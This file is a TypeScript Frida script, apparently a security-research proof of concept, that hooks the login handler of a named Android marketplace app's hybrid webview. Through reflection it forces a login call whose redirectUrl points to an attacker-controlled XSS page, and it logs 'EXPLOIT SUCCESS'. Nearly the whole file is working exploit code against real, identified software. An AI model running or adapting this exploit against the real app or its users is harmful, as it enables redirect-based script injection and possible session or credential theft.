import Java from "frida-java-bridge";

function run(): void {
    Java.perform(() => {
        const Uri = Java.use("android.net.Uri");
        
        try {
            const NMPHybridHandler = Java.use("com.schibsted.nmp.android.hybrid.NMPHybridHandler");
            
            // Hook handleUrl for observation
            NMPHybridHandler.handleUrl.implementation = function(url: any) {
                console.log("[H001-HOOK] handleUrl: " + url);
                return (this as any).handleUrl(url);
            };
            console.log("[H001] handleUrl hook installed");
            
            // Hook handleLogin to observe any calls with redirectUrl
            NMPHybridHandler.handleLogin.overload("android.net.Uri").implementation = function(uri: any) {
                const redirectUrl = uri.getQueryParameter("redirectUrl");
                console.log("[H001-HOOK] handleLogin called, redirectUrl=" + redirectUrl);
                return (this as any).handleLogin(uri);
            };
            console.log("[H001] handleLogin hook installed");
            
            // Hook the constructor to catch new instances
            NMPHybridHandler.$init.overload(
                "android.content.Context",
                "java.util.List",
                "com.schibsted.nmp.android.hybrid.NMPHybridHandler$Companion"
            ).implementation = function(ctx: any, list: any, comp: any) {
                console.log("[H001] NMPHybridHandler constructor called - new instance created!");
                (this as any).$init(ctx, list, comp);
                
                // Now we have the instance - try to call handleLogin
                const self = this;
                setTimeout(function() {
                    try {
                        const maliciousUri = Uri.parse(
                            "https://www.dba.dk/auth/app-login?redirectUrl=https://attacker.example.com/xss.html"
                        );
                        console.log("[H001] Invoking handleLogin on fresh instance with malicious redirectUrl");
                        const javaClass = NMPHybridHandler.class;
                        const methods = javaClass.getDeclaredMethods();
                        for (let i = 0; i < methods.length; i++) {
                            const m = methods[i];
                            if (m.getName() === "handleLogin") {
                                m.setAccessible(true);
                                const result = m.invoke(self, [maliciousUri]);
                                console.log("[H001] handleLogin() result: " + result);
                                console.log("[H001] EXPLOIT SUCCESS: attacker URL passed to new HybridScreen");
                                break;
                            }
                        }
                    } catch (e: any) {
                        console.log("[H001-INVOKE-ERROR] " + e);
                    }
                }, 1000);
            };
            
            // Try without companion parameter too
            try {
                NMPHybridHandler.$init.overload(
                    "android.content.Context",
                    "java.util.List"
                ).implementation = function(ctx: any, list: any) {
                    console.log("[H001] NMPHybridHandler constructor(ctx,list) called!");
                    return (this as any).$init(ctx, list);
                };
            } catch (e2: any) {
                // Different overload
            }
            
            console.log("[H001] Constructor hooks installed - waiting for HybridView to be created...");
            
        } catch (e: any) {
            console.log("[H001-ERROR] " + e);
        }
    });
}

run();
